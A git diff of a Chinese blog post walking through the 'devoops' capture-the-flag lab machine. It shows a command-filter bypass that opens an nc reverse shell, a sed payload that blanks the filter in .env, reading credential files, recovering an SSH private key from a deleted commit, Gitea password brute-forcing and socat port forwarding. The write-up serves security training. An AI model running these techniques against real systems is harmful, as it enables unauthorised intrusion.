+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>executed<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:{<span class="pl-s"><span class="pl-pds">"</span>stdout<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>uid=1000(runner) gid=1000(runner) groups=1000(runner)\n<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>stderr<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>}}</pre></div>
 <p>成功执行了命令<br>
 之前看见的命令过滤黑名单是</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
-COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl "http://$IP:3000/@fs/opt/node/.env?raw??"</span>
+COMMAND_FILTER=<span class="pl-s"><span class="pl-pds">'</span>nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd<span class="pl-pds">'</span></span></pre></div>
 <p>简单的绕过黑名单关键字加双引号，空格用+</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' 'http://192.168.31.25:3000/execute/?cmd=
-n""c+192.168.31.126+1234+-e+s""h'
-
-└─# nc -lvp 1234
-listening on [any] 1234 ...
-id
-connect to [192.168.31.126] from devoops [192.168.31.25] 41285
-uid=1000(runner) gid=1000(runner) groups=1000(runner)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' 'http://192.168.31.25:3000/execute/?cmd=</span>
+n<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>c+192.168.31.126+1234+-e+s<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>h<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s"></span>
+<span class="pl-s">└─# nc -lvp 1234</span>
+<span class="pl-s">listening on [any] 1234 ...</span>
+<span class="pl-s">id</span>
+<span class="pl-s">connect to [192.168.31.126] from devoops [192.168.31.25] 41285</span>
+<span class="pl-s">uid=1000(runner) gid=1000(runner) groups=1000(runner)</span></pre></div>
 <h5>出题者预期解</h5>
 <p>预期解法是构造 <code class="notranslate">payload</code>，修改<code class="notranslate">COMMAND_FILTER</code>的内容<br>
 但不能修改为空，会导致任何命令都不能执行</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">function is_safe_command(cmd) {
-if (!cmd || typeof cmd !== 'string') {
-return false;
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">function</span> <span class="pl-en">is_safe_command(cmd)</span> {
+<span class="pl-k">if</span> (<span class="pl-k">!</span>cmd <span class="pl-k">||</span> typeof cmd <span class="pl-k">!</span>== <span class="pl-s"><span class="pl-pds">'</span>string<span class="pl-pds">'</span></span>) {
+<span class="pl-k">return</span> <span class="pl-c1">false</span><span class="pl-k">;</span>
 }
-if (COMMAND_FILTER.length === 0) {
-return false;
+<span class="pl-k">if</span> (COMMAND_FILTER.length === 0) {
+<span class="pl-k">return</span> <span class="pl-c1">false</span><span class="pl-k">;</span>
 }
-}
-</code></pre>
+}</pre></div>
 <p>因为并没有过滤 <code class="notranslate">sed</code> 命令，可以尝试这个 <code class="notranslate">payload</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#http://192.168.31.25:3000/execute?cmd=sed -i 's/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env
-curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg2MDY3MjUsImV4cCI6MTc0ODYwODUyNX0.1aq1jaBqV4JVCg5cpnWqcGlXIryl1ai-XwT0ypKGWGA' http://$IP:3000/execute/?cmd=sed -i 's/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env
-
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>http://192.168.31.25:3000/execute?cmd=sed -i 's/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env</span>
+curl -s -H <span class="pl-s"><span class="pl-pds">'</span>authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg2MDY3MjUsImV4cCI6MTc0ODYwODUyNX0.1aq1jaBqV4JVCg5cpnWqcGlXIryl1ai-XwT0ypKGWGA<span class="pl-pds">'</span></span> http://<span class="pl-smi">$IP</span>:3000/execute/<span class="pl-k">?</span>cmd=sed -i <span class="pl-s"><span class="pl-pds">'</span>s/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/<span class="pl-pds">'</span></span> .env
+</pre></div>
 <p>执行后没有错误产生</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png" alt="image-20250530201653052" style="max-width: 100%;"></a></p>
 <p>现在再尝试使用黑名单中的命令，或者直接使用<code class="notranslate"> CVE</code> 读取 <code class="notranslate">.env</code></p>
@@ -1007,74 +993,68 @@ export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER=\"
 </code></pre>
 <p>发现过滤清单已经被修改<br>
 现在就可以随意执行命令了，例如反弹<code class="notranslate"> shell</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">nc 192.168.31.126 1234 -e sh
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc 192.168.31.126 1234 -e sh</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png" alt="image-20250530201937705" style="max-width: 100%;"></a></p>
 <h3><code class="notranslate">Gitea</code>服务</h3>
 <p>查看本地用户</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">cat /etc/passwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/passwd
 runner:x:1000:1000:::/bin/sh
 hana:x:1001:100::/home/hana:/bin/sh
 gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh
-cd /home
+<span class="pl-c1">cd</span> /home
 ls -artl
 total 12
 drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
-drwxr-xr-x    3 root     root          4096 Apr 21 12:09 .
-drwx------    3 hana     users         4096 Apr 21 14:30 hana
-</code></pre>
+drwxr-xr-x    3 root     root          4096 Apr 21 12:09 <span class="pl-c1">.</span>
+drwx------    3 hana     users         4096 Apr 21 14:30 hana</pre></div>
 <p>得到三个用户<code class="notranslate">runner</code> <code class="notranslate">hana</code> <code class="notranslate">gitea</code>,既然有个<code class="notranslate">gitea</code>用户，那必然有部署了<code class="notranslate">gitea</code>服务</p>
 <p>查看端口开放，本地开放<code class="notranslate">3002</code>端口</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">netstat -nltp
+<div class="highlight highlight-source-shell"><pre class="notranslate">netstat -nltp
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
-tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
-tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
-tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
-</code></pre>
+tcp        0      0 127.0.0.1:3002          0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2659/node
+tcp        0      0 127.0.0.1:22            0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp6       0      0 ::1:3001                :::<span class="pl-k">*</span>                    LISTEN      2664/node</pre></div>
 <p>还发现了<code class="notranslate"> 22</code> 和 <code class="notranslate">3002</code> 端口<br>
 没有用户密码和私钥，暂时没有办法利用 <code class="notranslate">22 </code>端口。先看<code class="notranslate"> 3002</code> 端口<br>
 因为并没有显示进程名，所以使用 <code class="notranslate">ps </code>命令看一下本地运行的进程</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#ps aux
- 2492 root      0:00 supervise-daemon gitea --start --pidfile /run/gitea.pid --respawn-delay 2 --respawn-max 5 --respawn-period 1800 --capabilities ^cap_net_bind_service --user gitea --env GITEA_WORK_DIR=/var/lib/gitea --chdir /var/lib/gitea --stdout /var/log/gitea/http.log --stderr /var/log/gitea/http.log /usr/bin/gitea -- web --config /etc/gitea/app.ini
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>ps aux</span>
+ 2492 root      0:00 supervise-daemon gitea --start --pidfile /run/gitea.pid --respawn-delay 2 --respawn-max 5 --respawn-period 1800 --capabilities ^cap_net_bind_service --user gitea --env GITEA_WORK_DIR=/var/lib/gitea --chdir /var/lib/gitea --stdout /var/log/gitea/http.log --stderr /var/log/gitea/http.log /usr/bin/gitea -- web --config /etc/gitea/app.ini</pre></div>
 <p>发现 <code class="notranslate">Gitea</code> 服务</p>
 <h5>解法1</h5>
 <p>同时，在 <code class="notranslate">/opt </code>目录下发现 <code class="notranslate">gitea </code>目录</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">cd /opt
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /opt
 ls -artl
 total 16
 drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
 drwxrwx---    6 root     runner        4096 Apr 21 11:38 node
-drwxr-xr-x    4 root     root          4096 Apr 21 13:41 .
-drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 gitea
-</code></pre>
+drwxr-xr-x    4 root     root          4096 Apr 21 13:41 <span class="pl-c1">.</span>
+drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 gitea</pre></div>
 <p>任意用户对<code class="notranslate">/opt/gitea</code>具有读取权限<br>
 可以直接查看 Gitea 的配置文件，找到 Git 仓库的存储路径在 /etc/gitea/app.ini(其实ps就有这个信息)</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#cat /etc/gitea/app.ini
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>cat /etc/gitea/app.ini</span>
 .....
 
 [repository]
 ROOT = /opt/gitea/git
-SCRIPT_TYPE = sh
-</code></pre>
+SCRIPT_TYPE = sh</pre></div>
 <p>得到仓库地址为<code class="notranslate">/opt/gitea/git</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">cd /opt/gitea/git
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /opt/gitea/git
 ls -artl
 total 12
 drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 ..
-drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 <span class="pl-c1">.</span>
 drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 hana
-pwd
+<span class="pl-c1">pwd</span>
 /opt/gitea/git
-cd hana
+<span class="pl-c1">cd</span> hana
 ls -artl
 total 12
 drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
-drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 .
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 <span class="pl-c1">.</span>
 drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
-cd node.git
+<span class="pl-c1">cd</span> node.git
 ls -artl
 total 44
 drwxr-xr-x    4 gitea    www-data      4096 Apr 21 14:35 refs
@@ -1087,47 +1067,43 @@ drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 ..
 drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 logs
 drwxr-xr-x   24 gitea    www-data      4096 Apr 21 14:36 objects
 drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:36 info
-drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 .
-</code></pre>
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 <span class="pl-c1">.</span></pre></div>
 <p>此处暴露了 2 个信息</p>
 <p>并且在<code class="notranslate">opt/gitea/git</code>下存在文件夹<code class="notranslate">hana</code>，和 <code class="notranslate">Linux </code>操作系统用户相对应</p>
 <p>发现在<code class="notranslate">node.git</code>文件夹下存在<code class="notranslate">.git</code>相关目录文件，只不过文件名不是<code class="notranslate">.git</code><br>
 同时，靶机内也有<code class="notranslate"> git</code> 命令可用</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">which git
-/usr/bin/git
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">which git
+/usr/bin/git</pre></div>
 <p>将<code class="notranslate"> Git</code> 目录拷贝到 <code class="notranslate">/tmp </code>目录</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">mkdir /tmp/repo
-pwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">mkdir /tmp/repo
+<span class="pl-c1">pwd</span>
 /opt/gitea/git/hana/node.git
-cd ..
-pwd
+<span class="pl-c1">cd</span> ..
+<span class="pl-c1">pwd</span>
 /opt/gitea/git/hana
-cp -r ./node.git/ /tmp/repo/.git
-</code></pre>
+cp -r ./node.git/ /tmp/repo/.git</pre></div>
 <p>修改文件名，查看<code class="notranslate">git log</code>，查看<code class="notranslate"> commit</code> 日志</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">git log
+<div class="highlight highlight-source-shell"><pre class="notranslate">git log
 commit 1994a70bbd080c633ac85a339fd85a8635c63893
-Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
+Author: azwhikaru <span class="pl-k">&lt;</span>37921907+azwhikaru@users.noreply.github.com<span class="pl-k">&gt;</span>
 Date:   Mon Apr 21 14:36:12 2025 +0800
 
-    del: oops!
+    del: oops<span class="pl-k">!</span>
 
 commit 02c0f912f6e5b09616580d960f3e5ee33b06084a
-Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
+Author: azwhikaru <span class="pl-k">&lt;</span>37921907+azwhikaru@users.noreply.github.com<span class="pl-k">&gt;</span>
 Date:   Mon Apr 21 14:34:37 2025 +0800
 
     init: init commit
-pwd
-/tmp/repo/.git
-</code></pre>
+<span class="pl-c1">pwd</span>
+/tmp/repo/.git</pre></div>
 <p>发现一个删除提交<code class="notranslate">del: oops!</code>,查看这个<code class="notranslate"> commit</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">git show 1994a70bbd080c633ac85a339fd85a8635c63893
+<div class="highlight highlight-source-shell"><pre class="notranslate">git show 1994a70bbd080c633ac85a339fd85a8635c63893
 commit 1994a70bbd080c633ac85a339fd85a8635c63893
-Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
+Author: azwhikaru <span class="pl-k">&lt;</span>37921907+azwhikaru@users.noreply.github.com<span class="pl-k">&gt;</span>
 Date:   Mon Apr 21 14:36:12 2025 +0800
 
-    del: oops!
+    del: oops<span class="pl-k">!</span>
 
 diff --git a/id_ed25519 b/id_ed25519
 deleted file mode 100644
@@ -1141,168 +1117,155 @@ index a2626a4..0000000
 -5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
 -AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
 -WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-------END OPENSSH PRIVATE KEY-----
-</code></pre>
+------END OPENSSH PRIVATE KEY-----</pre></div>
 <p>获得<code class="notranslate">SSH</code>私钥(注意：私钥每行开头多了个<code class="notranslate">-</code>)</p>
 <h5>解法2</h5>
 <p>靶机的 <code class="notranslate">Gitea </code>服务是有 <code class="notranslate">Web</code> 的，使用靶机内预留了<code class="notranslate"> socat</code>端口转发工具,将<code class="notranslate"> 127.0.0.1:3002</code> 转发到外网地址即可访问</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">kali└─# tldr socat
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> tldr socat</span>
    sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
-#socat TCP-LISTEN:3020,fork TCP4:127.0.0.1:3002&amp;
+<span class="pl-c"><span class="pl-c">#</span>socat TCP-LISTEN:3020,fork TCP4:127.0.0.1:3002&amp;</span>
 netstat -anlptu
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
-tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
-tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2720/node
-tcp        0      0 0.0.0.0:3020            0.0.0.0:*               LISTEN      2760/socat
+tcp        0      0 127.0.0.1:22            0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp        0      0 127.0.0.1:3002          0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2720/node
+tcp        0      0 0.0.0.0:3020            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2760/socat
 tcp        0      0 192.168.31.25:3000      192.168.31.191:4655     ESTABLISHED 2720/node
 tcp        0      0 192.168.31.25:45235     192.168.31.126:1234     ESTABLISHED 2758/sh
-tcp6       0      0 ::1:3001                :::*                    LISTEN      2726/node
+tcp6       0      0 ::1:3001                :::<span class="pl-k">*</span>                    LISTEN      2726/node
 tcp6       0      0 ::1:49578               ::1:3001                ESTABLISHED 2720/node
-tcp6       0      0 ::1:3001                ::1:49578               ESTABLISHED 2726/node
-</code></pre>
+tcp6       0      0 ::1:3001                ::1:49578               ESTABLISHED 2726/node</pre></div>
 <p>访问<code class="notranslate">Web</code>之后，自然是爆破用户名和密码,用户名就是靶机内唯一的正常用户<code class="notranslate"> hana</code></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202840863.png" alt="image-20250530202840863" style="max-width: 100%;"></a></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">出题者在制作靶机的时候，`Gitea` 先是监听在0.0.0.0，没有经过`socat`
-`hydra`爆破速度非常快，即使是`rockyou`也能在 ~30 秒内找到密码
-但是经过`socat`之后爆破效率变得很低
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">出题者在制作靶机的时候，<span class="pl-s"><span class="pl-pds">`</span>Gitea<span class="pl-pds">`</span></span> 先是监听在0.0.0.0，没有经过<span class="pl-s"><span class="pl-pds">`</span>socat<span class="pl-pds">`</span></span>
+<span class="pl-s"><span class="pl-pds">`</span>hydra<span class="pl-pds">`</span></span>爆破速度非常快，即使是<span class="pl-s"><span class="pl-pds">`</span>rockyou<span class="pl-pds">`</span></span>也能在 <span class="pl-k">~</span>30 秒内找到密码
+但是经过<span class="pl-s"><span class="pl-pds">`</span>socat<span class="pl-pds">`</span></span>之后爆破效率变得很低</pre></div>
 <p>最后爆破得到密码 <code class="notranslate">saki</code><br>
 进入 <code class="notranslate">Gitea</code> 后，查看唯一的仓库的 <code class="notranslate">commit </code>记录<code class="notranslate">代码</code>-<code class="notranslate">提交</code>- <code class="notranslate">del: oops!</code></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png"><img src="https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530202951278.png" alt="image-20250530202951278" style="max-width: 100%;"></a></p>
 <p>同样可以获得 <code class="notranslate">SSH</code>私钥</p>
 <h3>获得<code class="notranslate">hana</code>权限</h3>
 <p>之前查看监听的端口时，发现 <code class="notranslate">SSH</code> 也监听在<code class="notranslate"> 127.0.0.1</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#netstat -anlptu
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>netstat -anlptu</span>
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
-tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
-tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3002          0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2659/node
+tcp        0      0 127.0.0.1:22            0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
 tcp        0     54 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
 tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
-tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
+tcp6       0      0 ::1:3001                :::<span class="pl-k">*</span>                    LISTEN      2664/node
 tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
-tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
-</code></pre>
+tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node</pre></div>
 <h5><code class="notranslate">socat </code>端口转发</h5>
 <p>使用本机 <code class="notranslate">socat </code>转发端口，将只能本机访问的<code class="notranslate">127.0.0.1:22</code>转发到外部网络<code class="notranslate">0.0.0.0:2222</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#which socat
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>which socat</span>
 /usr/bin/socat
-kali└─# tldr socat
+kali└─<span class="pl-c"><span class="pl-c">#</span> tldr socat</span>
    sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
-#socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22&amp;
-#将本地端口 2222 的入站 TCP 流量转发到本机（127.0.0.1）的 22 端口
-#netstat -anlptu
+<span class="pl-c"><span class="pl-c">#</span>socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22&amp;</span>
+<span class="pl-c"><span class="pl-c">#</span>将本地端口 2222 的入站 TCP 流量转发到本机（127.0.0.1）的 22 端口</span>
+<span class="pl-c"><span class="pl-c">#</span>netstat -anlptu</span>
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
-tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
-tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      2749/socat
-tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3002          0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2659/node
+tcp        0      0 0.0.0.0:2222            0.0.0.0:<span class="pl-k">*</span>               LISTEN      2749/socat
+tcp        0      0 127.0.0.1:22            0.0.0.0:<span class="pl-k">*</span>               LISTEN      -
 tcp        0      0 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
 tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
-tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
+tcp6       0      0 ::1:3001                :::<span class="pl-k">*</span>                    LISTEN      2664/node
 tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
-tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
-</code></pre>
+tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node</pre></div>
 <p>转出<code class="notranslate">SSH</code>端口后，就可以用获得的<code class="notranslate">SSH</code>私钥登陆了</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# echo '------BEGIN OPENSSH PRIVATE KEY-----
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo '------BEGIN OPENSSH PRIVATE KEY-----</span>
 -b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 -QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
 -5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
 -AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
 -WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-------END OPENSSH PRIVATE KEY-----'&gt;id
-└─# chmod 600 id
-└─# ssh hana@$IP -p 2222 -i id
-#登录失败，私钥每行多了个`-`
-└─# cat id | sed 's/^.//g'&gt;id2
-
-└─# cat id2
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
-└─# chmod 600 id2
-└─# ssh hana@$IP -p 2222 -i id2
-devoops:~$ id
-uid=1001(hana) gid=100(users) groups=100(users),100(users)
-
-</code></pre>
+------END OPENSSH PRIVATE KEY-----<span class="pl-s"><span class="pl-pds">'</span>&gt;id</span>
+<span class="pl-s">└─# chmod 600 id</span>
+<span class="pl-s">└─# ssh hana@$IP -p 2222 -i id</span>
+<span class="pl-s">#登录失败，私钥每行多了个`-`</span>
+<span class="pl-s">└─# cat id | sed <span class="pl-pds">'</span></span>s/^.//g<span class="pl-s"><span class="pl-pds">'</span>&gt;id2</span>
+<span class="pl-s"></span>
+<span class="pl-s">└─# cat id2</span>
+<span class="pl-s">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="pl-s">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span>
+<span class="pl-s">QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN</span>
+<span class="pl-s">5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg</span>
+<span class="pl-s">AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z</span>
+<span class="pl-s">WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==</span>
+<span class="pl-s">-----END OPENSSH PRIVATE KEY-----</span>
+<span class="pl-s">└─# chmod 600 id2</span>
+<span class="pl-s">└─# ssh hana@$IP -p 2222 -i id2</span>
+<span class="pl-s">devoops:~$ id</span>
+<span class="pl-s">uid=1001(hana) gid=100(users) groups=100(users),100(users)</span>
+<span class="pl-s"></span></pre></div>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">devoops:~$ id
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ id
 uid=1001(hana) gid=100(users) groups=100(users),100(users)
-devoops:~$ cd
-devoops:~$ ls
+devoops:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
